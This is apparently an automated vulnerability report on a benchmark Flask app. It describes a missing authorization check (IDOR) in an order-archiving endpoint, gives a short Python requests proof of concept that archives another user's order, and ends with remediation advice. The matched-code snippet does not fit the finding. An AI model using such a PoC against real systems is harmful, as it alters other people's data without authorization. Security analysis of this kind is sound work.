# Security Analysis: routes.py - HTTP request handlers

## ファイル情報

- **ファイルパス**: `benchmarks/XBEN-002-24/app/website/app/routes.py`
- **検出パターン**: HTTP request handlers

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `IDOR`

## PAR Policy Analysis

### Principals (データ源)

- **session.user_id**: SemiTrusted
  - Context: Flask session cookie
  - Risk Factors: session hijacking, session fixation
- **order_id**: Untrusted
  - Context: URL path parameter
  - Risk Factors: IDOR reference manipulation

### Actions (セキュリティ制御)

- **Order.query.filter(Order.id == order_id).first_or_404()**: Missing
  - Function: object retrieval
  - Weaknesses: missing authorization
  - Bypass Vectors: manipulate order_id to archive others' orders
- **order.archiver = user; order.archived = True; db.session.commit()**: Missing
  - Function: state modification
  - Weaknesses: missing authorization
  - Bypass Vectors: direct object reference manipulation

### Resources (操作対象)

- **Order**: High
  - Operation: update
  - Protection: 

### Policy Violations

#### IDOR-01: Insecure Direct Object Reference: no authorization check on order archiving (Pattern: HTTP request handlers)

- **Path**: order_archive -> Order.query.filter(Order.id == order_id).first_or_404()
- **Severity**: high
- **Confidence**: 0.90

## マッチしたソースコード

```code
add_header
```

## 詳細解析

The order_archive endpoint lacks proper authorization checks when archiving orders. By directly using the order_id path parameter to retrieve and modify Order records without verifying Order.creator against the current user, an attacker can manipulate the order_id to archive arbitrary orders (Insecure Direct Object Reference).

## PoC（概念実証コード）

```text
# Proof-of-Concept: Archive an order you do not own
import requests

# Authenticate as a legitimate user
session = requests.Session()
session.post('http://example.com/', data={'username':'alice'})
session.post('http://example.com/password/alice', data={'password':'alice_password'})

# Exploit IDOR by archiving order ID 42 belonging to another user
resp = session.get('http://example.com/order/42/archive')
print(resp.status_code, resp.text)
```

## 修復ガイダンス

### order_archive endpoint

- **Required**: Implement authorization checks
- **Guidance**: Before archiving, verify that Order.creator == current_user. Reject or return 403 if the current user is not the creator of the order.
- **Priority**: high

## 解析ノート

Identified order_archive lacks creator check -> IDOR. Principals: session.user_id (semi_trusted), order_id (untrusted). Actions: object retrieval and state modification missing auth. Resource: Order update high sensitivity. Policy violation IDOR-01. Provided POC and remediation.

